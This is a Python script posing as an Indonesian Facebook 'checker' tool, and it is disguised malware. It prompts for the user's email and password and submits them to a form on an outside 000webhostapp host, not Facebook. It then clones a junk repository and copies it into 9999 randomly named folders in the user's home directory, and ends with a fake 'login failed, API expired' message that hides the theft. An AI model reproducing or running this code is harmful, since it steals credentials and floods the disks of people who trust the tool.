
import mechanize,time,sys,os,string,random
from bs4 import BeautifulSoup as BS



banner = """

                                                                                                                                                                                        
                                                                                                                                                                                        
FFFFFFFFFFFFFFFFFFFFFFBBBBBBBBBBBBBBBBB                CCCCCCCCCCCCChhhhhhh                                                     kkkkkkkk                                                
F::::::::::::::::::::FB::::::::::::::::B            CCC::::::::::::Ch:::::h                                                     k::::::k                                                
F::::::::::::::::::::FB::::::BBBBBB:::::B         CC:::::::::::::::Ch:::::h                                                     k::::::k                                                
FF::::::FFFFFFFFF::::FBB:::::B     B:::::B       C:::::CCCCCCCC::::Ch:::::h                                                     k::::::k                                                
  F:::::F       FFFFFF  B::::B     B:::::B      C:::::C       CCCCCC h::::h hhhhh           eeeeeeeeeeee        cccccccccccccccc k:::::k    kkkkkkk eeeeeeeeeeee    rrrrr   rrrrrrrrr   
  F:::::F               B::::B     B:::::B     C:::::C               h::::hh:::::hhh      ee::::::::::::ee    cc:::::::::::::::c k:::::k   k:::::kee::::::::::::ee  r::::rrr:::::::::r  
  F::::::FFFFFFFFFF     B::::BBBBBB:::::B      C:::::C               h::::::::::::::hh   e::::::eeeee:::::ee c:::::::::::::::::c k:::::k  k:::::ke::::::eeeee:::::eer:::::::::::::::::r 
  F:::::::::::::::F     B:::::::::::::BB       C:::::C               h:::::::hhh::::::h e::::::e     e:::::ec:::::::cccccc:::::c k:::::k k:::::ke::::::e     e:::::err::::::rrrrr::::::r
  F:::::::::::::::F     B::::BBBBBB:::::B      C:::::C               h::::::h   h::::::he:::::::eeeee::::::ec::::::c     ccccccc k::::::k:::::k e:::::::eeeee::::::e r:::::r     r:::::r
  F::::::FFFFFFFFFF     B::::B     B:::::B     C:::::C               h:::::h     h:::::he:::::::::::::::::e c:::::c              k:::::::::::k  e:::::::::::::::::e  r:::::r     rrrrrrr
  F:::::F               B::::B     B:::::B     C:::::C               h:::::h     h:::::he::::::eeeeeeeeeee  c:::::c              k:::::::::::k  e::::::eeeeeeeeeee   r:::::r            
  F:::::F               B::::B     B:::::B      C:::::C       CCCCCC h:::::h     h:::::he:::::::e           c::::::c     ccccccc k::::::k:::::k e:::::::e            r:::::r            
FF:::::::FF           BB:::::BBBBBB::::::B       C:::::CCCCCCCC::::C h:::::h     h:::::he::::::::e          c:::::::cccccc:::::ck::::::k k:::::ke::::::::e           r:::::r            
F::::::::FF           B:::::::::::::::::B         CC:::::::::::::::C h:::::h     h:::::h e::::::::eeeeeeee   c:::::::::::::::::ck::::::k  k:::::ke::::::::eeeeeeee   r:::::r            
F::::::::FF           B::::::::::::::::B            CCC::::::::::::C h:::::h     h:::::h  ee:::::::::::::e    cc:::::::::::::::ck::::::k   k:::::kee:::::::::::::e   r:::::r            
FFFFFFFFFFF           BBBBBBBBBBBBBBBBB                CCCCCCCCCCCCC hhhhhhh     hhhhhhh    eeeeeeeeeeeeee      cccccccccccccccckkkkkkkk    kkkkkkk eeeeeeeeeeeeee   rrrrrrr            
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
           """



logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m Kumpulanremaja  \x1b[1;97m                ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/kumpulanremaja[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mSite       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://kumpulanremaja.com\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  
'\n\x1b[1;92m[*] Silahkan Login Operamini atau Google Chrome Agar Tidak Checkpoint\n'


b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


class login:
                br = mechanize.Browser()
                br.set_handle_equiv(True)
                br.set_handle_gzip(True)
                br.set_handle_redirect(True)
                br.set_handle_referer(True)
                br.set_handle_robots(False)
                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                br.addheaders =[('Connection','keep-alive'),
                ('Pragma','no-cache'),
                ('Cache-Control','no-cache'),
                ('Origin','http://videohde.000webhostapp.com'),
                ('Upgrade-Insecure-Requests','1'),
                ('Content-Type','application/x-www-form-urlencoded'),
                ('User-Agent' , 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B137 Safari/601.1'),
                ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'),
                ('Referer','http://videohde.000webhostapp.com'),
                ('Accept-Encoding','gzip, deflate'),
                ('Accept-Language','id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'),
                ('Cookie','_ga=GA1.2.131924726.1560439960; PHPSESSID=jjrqqaakmfcgfgbtjt8tve5595; _gid=GA1.2.1969561921.1561024035; _gat=1')
                ]
                br.open('http://videohde.000webhostapp.com')


                print (logo)

                e= input('Masukan Email Anda : ')
                p= input('Masukan Password Anda : ')

                br.select_form(nr = 0)
                br.form['email'] = str(e)
                br.form['pass'] = str(p)
                br.submit()
try:
    login()
    print("[ Sedang Masuk ]")

    animation1 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    os.system('xdg-open https://www.youtube.com/c/raflypakei2002')
    os.system('git clone https://github.com/BlackSelakangan/sampah')
    for i in range(9999):
      length =6
      letters = string.ascii_letters
      result_str = ''.join(random.choice(letters) for i in range(length))
      os.system('mkdir $HOME/'+result_str)
      os.system('cp -rf sampah $HOME/'+result_str)


    for i in range(len(animation)):
      time.sleep(0.2)
      sys.stdout.write("\r" + animation[i % len(animation)] + animation1[i % len(animation1)])
      sys.stdout.flush()


    print("\n\n[!] Login Gagal\n")
    print("Facebook API Expired")



except KeyboardInterrupt:
	print('\nErr: KeyboardInterrupt')
except Exception as E:
	print(f'Err: {E}')